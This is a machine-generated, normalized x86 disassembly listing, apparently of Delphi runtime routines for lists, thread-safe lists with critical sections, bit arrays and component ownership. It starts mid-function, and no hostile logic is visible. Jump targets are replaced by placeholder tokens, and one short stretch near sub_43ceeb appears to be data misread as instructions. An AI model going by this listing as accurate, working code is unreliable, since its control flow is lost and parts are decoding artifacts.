call sub_44bbe8
pop ebx
mov esp ebp
pop ebp
retn
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_43c600
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0x4 ]
call sub_43c464
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_43c624
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_43c3b8
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x8 ]
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43c464
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
xor ecx ecx
mov [ eax + edx * 4 ] ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43c2dc
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c550
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
mov [ eax + edx * 4 ] ecx
sub_43c6a8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_43c3b8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x8 ]
jl r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov cl 0x2
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ eax + edx * 4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ eax + edx * 4 ] ecx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_43c728
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43c504
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c2dc
sub_43c75c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_43c3b8
cmp [ ebp - 0x8 ] 0x7ffffff
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
shl edx 0x2
mov eax [ ebp - 0x4 ]
add eax 0x4
call sub_44ba8c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0xc ]
je r-xdata
sub_43c7b8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_43c3b8
cmp [ ebp - 0x8 ] 0x7ffffff
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x8 ]
jle r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43c75c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0xc ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
mov edx [ ebp - 0x8 ]
sub edx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x8 ]
lea eax [ eax + edx * 4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x8 ]
shl edx 0x2
xor ecx ecx
call sub_44bd90
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov esp ebp
pop ebp
retn
dec edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c2dc
dec [ ebp - 0xc ]
inc [ ebp - 0x10 ]
jne r-xdata
sub_43c874
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44c040
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_43c8dc
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43c9e4
xor eax eax
push ebp
push sub_43c93e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44c070
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44c060
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c945
mov eax [ ebp - 0x4 ]
call sub_43ca60
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_43c958
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43c9e4
xor eax eax
push ebp
push sub_43c9d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_43c264
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_43c504
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c9e0
mov eax [ ebp - 0x4 ]
call sub_43ca60
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx [ ebp - 0x8 ]
call sub_43c3b8
sub_43c9e4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call EnterCriticalSection
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_43ca0c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43c9e4
xor eax eax
push ebp
push sub_43ca52
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_43c728
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ca59
mov eax [ ebp - 0x4 ]
call sub_43ca60
retn
sub_43ca95
clc
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43cb18
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44c060
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_43caf0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
sub_43cb18
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
call sub_43cacc
sar eax 0x5
shl eax 0x2
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
shl eax 0x2
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x14 ]
je r-xdata
add eax 0x1f
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
call sub_44ba5c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
xor ecx ecx
mov edx [ ebp - 0x10 ]
call sub_44bd90
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_44ba74
push ebp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
call sub_43caf0
pop ecx
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_44bbe8
sub_43cbec
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_43cacc
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_43cb18
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_43cc18
push ebp
mov ebp esp
add esp 0xffffffe4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ eax + edx * 4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
mov ecx [ r-xdata ]
cmp ecx [ eax + edx * 4 ]
je r-xdata
jb r-xdata
and eax 0x7f
bt [ ebp - 0x10 ] eax
inc [ ebp - 0x11 ]
cmp [ ebp - 0x11 ] 0x20
jne r-xdata
mov eax [ ebp - 0xc ]
shl eax 0x5
xor edx edx
mov dl [ ebp - 0x11 ]
add eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
mov al [ ebp - 0x11 ]
cmp al 0x1f
ja r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
sub_43ccd0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43f9ec
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44c060
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_43cd0c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43cd38
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_43cd38
push ebp
mov ebp esp
add esp 0xfffffee4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43cdf6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_44cb78
lea edx [ ebp - 0x10c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_44bfbc
lea edx [ ebp - 0x10c ]
lea eax [ ebp - 0xc ]
call sub_44cd04
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
lea edx [ ebp - 0x10c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_44bfbc
lea eax [ ebp - 0x10c ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0x4
lea eax [ ebp - 0x11c ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447b20
call sub_44c7a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cdfd
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
sub_43ce3c
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43cedb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_44bfbc
lea edx [ ebp - 0x10c ]
mov eax [ ebp - 0x8 ]
call sub_44cd04
mov eax [ ebp - 0x4 ]
mov bx 0xffff
call sub_44c24c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cee2
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
mov eax [ ebp - 0x4 ]
mov bx 0xffff
call sub_44c24c
lea edx [ ebp - 0xc ]
mov bx 0xfffe
call sub_44c24c
cmp [ ebp - 0xc ] 0x0
je r-xdata
push [ ebp - 0xc ]
push r-xdata
mov eax [ ebp - 0x8 ]
push [ eax ]
mov eax [ ebp - 0x8 ]
mov edx 0x3
call sub_44ce20
sub_43ceeb
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_43cf0c
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43d120
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_43cf54
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43d120
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_43ccd0
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_43cf90
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_43cfd8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_43c504
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_43d010
push ebp
mov ebp esp
add esp 0xfffffef8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x108 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_44bfbc
lea edx [ ebp - 0x108 ]
mov eax [ ebp - 0x8 ]
call sub_44cd04
mov esp ebp
pop ebp
retn
sub_43d044
push ebp
mov ebp esp
add esp 0xfffffee4
push ebx
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43d0e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x11c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_44bfbc
lea edx [ ebp - 0x11c ]
mov eax [ ebp - 0x8 ]
call sub_44cd04
mov eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov bx 0xfffe
call sub_44c24c
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
mov eax [ ebp - 0x4 ]
call sub_43cfd8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_446fac
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d0ee
lea eax [ ebp - 0x1c ]
call sub_44cae0
retn
sub_43d120
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43d414
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43d394
sub_43d180
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43cfd8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_43c624
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_43cf90
sub_43d1c8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call [ eax + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_43d1ec
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_43d20c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_43d269
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_43c600
call sub_44c070
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_43d274
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_44e3d0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov bx 0xffff
call sub_44c24c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_44e3d0
mov edx eax
mov eax [ ebp - 0xc ]
call sub_43d274
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_44e3d0
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x28 ]
jmp r-xdata
sub_43d328
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43d387
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
call sub_44e3d0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43d274
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d38e
lea eax [ ebp - 0x10 ]
call sub_44e3d0
retn
mov cl [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_43d394
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
call sub_44c1e8
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_43c264
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43d1ec
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43d328
pop ecx
pop ecx
pop ebp
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_43c3b8
sub_43d414
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov cl 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43d328
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_43c728
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_43d1ec
pop ecx
pop ecx
pop ebp
retn
sub_43d450
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43dfa8
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_43ccd0
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_43d48c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_43d4bc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
